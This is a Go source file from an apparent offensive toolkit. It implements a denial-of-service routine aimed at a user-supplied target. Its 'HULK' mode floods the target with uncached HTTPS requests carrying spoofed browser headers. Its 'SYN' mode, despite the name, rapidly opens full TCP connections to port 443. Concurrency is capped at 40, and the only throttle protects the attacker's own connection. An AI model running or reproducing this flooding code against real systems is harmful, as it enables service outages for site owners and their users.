package intel

import (
	"context"
	"fmt"
	"net"
	"net/http"
	"sync"
	"time"
	"github.com/AnonPhoenix420/cyph3r/internal/output"
)

const (
	SafetyLatency = 180 * time.Millisecond 
	MaxBurst      = 40
)

type TacticalConfig struct {
	Target string
	Vector string 
	PPS    int    
}

func RunTacticalTest(cfg TacticalConfig, ctx context.Context) {
	var wg sync.WaitGroup
	sem := make(chan struct{}, MaxBurst)

	// Pulls from your colors.go
	fmt.Printf("\n%s[GHOST_MODE] ENGAGING %s VECTOR -> %s%s\n", output.NeonPink, cfg.Vector, cfg.Target, output.Reset)

	for {
		select {
		case <-ctx.Done():
			fmt.Printf("\n%s[+] Session Terminated. Clean Exit.%s\n", output.NeonGreen, output.Reset)
			return
		default:
			if checkLocalCongestion() {
				time.Sleep(1 * time.Second)
				continue
			}

			sem <- struct{}{}
			wg.Add(1)
			go func() {
				defer wg.Done()
				defer func() { <-sem }()
				executeScrubbedVector(cfg)
			}()
			
			time.Sleep(time.Second / time.Duration(cfg.PPS))
		}
	}
}

func executeScrubbedVector(cfg TacticalConfig) {
	client := &http.Client{Timeout: 2 * time.Second}
	
	switch cfg.Vector {
	case "HULK":
		req, _ := http.NewRequest("GET", "https://"+cfg.Target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36")
		req.Header.Set("Cache-Control", "no-cache")
		
		resp, err := client.Do(req)
		if err == nil { resp.Body.Close() }

	case "SYN":
		d := net.Dialer{Timeout: 500 * time.Millisecond}
		conn, err := d.Dial("tcp", cfg.Target+":443")
		if err == nil { conn.Close() }
	}
}

func checkLocalCongestion() bool {
	start := time.Now()
	conn, err := net.DialTimeout("tcp", "1.1.1.1:53", 250*time.Millisecond)
	if err != nil { return true }
	conn.Close()
	return time.Since(start) > SafetyLatency
}
